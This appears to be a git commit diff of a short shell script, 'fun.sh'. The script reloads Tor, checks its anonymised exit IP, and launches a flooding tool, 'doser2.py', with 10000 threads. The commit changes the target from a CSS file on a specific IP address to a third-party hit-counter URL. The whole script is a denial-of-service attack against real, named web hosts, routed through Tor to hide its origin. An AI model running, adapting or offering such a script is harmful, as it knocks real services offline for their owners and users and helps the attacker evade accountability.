92cd3822222fcba9ae06fee582aa7ab5f11d51e0
Carabaya <94078994+Carabaya@users.noreply.github.com>
2022-08-20 21:50:27 -0500

    Update fun.sh

--- fun.sh
+++ fun.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 service tor reload &>/dev/null
 curl --socks5 127.0.0.1:9050 ip.p3terx.com
-python3 doser2.py -g 'http://51.222.105.32/static/app-assets/css/app.css' -t 10000
+python3 doser2.py -g 'https://count.getloli.com/get/@nekohasekai?theme=rule34' -t 10000
